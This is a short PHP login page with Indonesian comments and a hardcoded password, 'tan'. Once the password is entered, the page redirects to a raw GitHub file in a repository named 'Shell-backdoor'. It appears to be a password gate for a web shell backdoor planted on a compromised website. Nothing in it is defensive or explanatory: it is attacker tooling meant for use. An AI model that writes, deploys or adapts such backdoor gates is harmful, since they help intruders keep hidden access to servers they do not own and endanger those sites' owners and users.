<?php
session_start();

// Jika sudah login, langsung redirect
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
    exit;
}

// Proses login
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'];
    if ($password === 'tan') {
        $_SESSION['loggedin'] = true;
        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
        exit;
    } else {
        $error = "Password salah!";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <?php
    if (isset($error)) {
        echo "<p style='color:red;'>$error</p>";
    }
    ?>
    <form method="post" action="">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
